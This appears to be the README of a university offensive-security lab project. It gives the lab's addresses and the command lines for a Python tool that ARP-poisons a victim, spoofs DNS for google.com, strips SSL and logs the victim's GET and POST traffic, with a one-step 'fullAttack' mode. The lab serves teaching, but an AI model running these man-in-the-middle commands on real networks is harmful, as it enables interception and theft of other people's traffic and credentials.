# 2IC80Project
Lab on Offensive Computer Security
"
### Video link of the demo
https://www.youtube.com/watch?v=uOcwnNOZDNY&ab_channel=Ruud
### Addresses:
Attacker:
10.0.123.4  08:00:27:4f:6a:5d

Victim:
10.0.123.5  08:00:27:23:55:6e

Gateway:
10.0.123.1  52:54:00:12:35:00

### Commands:

See ARP table: `arp`
Clear ARP table: `sudo ip -s -s neigh flush all`

# Run steps separately:
1. ARP poison the victim: 
`sudo python3 main.py --interface "enp0s10" arpPoison --ipVictim "10.0.123.5" --ipToSpoof "10.0.123.1"`

3. DNS Spoof the victim: `sudo python3 main.py --interface "enp0s10" dnsSpoof --ipVictim "10.0.123.5" --siteToSpoof "google.com"` 

4. SSL Strip traffic coming from the victim: `sudo python3 main.py --interface "enp0s10" sslStrip --ipVictim "10.0.123.5" --siteToSpoof "google.com"` 

### For the forwarder to work we must first terminate the webserver that is running by default on the attacker machine.
### 1. Determine the PID of the process: sudo lsof -i :80
### 2. Kill the process: sudo kill <PID>
5. Forward `sudo python3 main.py --interface "enp0s10" forward --ipVictim "10.0.123.5" --siteToSpoof "google.com" --get_file ./get.txt --post_file ./post.txt`

# Or Run the full attack at once:
### For the forwarder to work we must first terminate the webserver that is running by default on the attacker machine.
### 1. Determine the PID of the process: sudo lsof -i :80
### 2. Kill the process: sudo kill <PID>
1. `sudo python3 main.py --interface "enp0s10" fullAttack --ipVictim "10.0.123.5" --ipGateway "10.0.123.1" --siteToSpoof "google.com" --get_file ./get.txt --post_file ./post.txt`
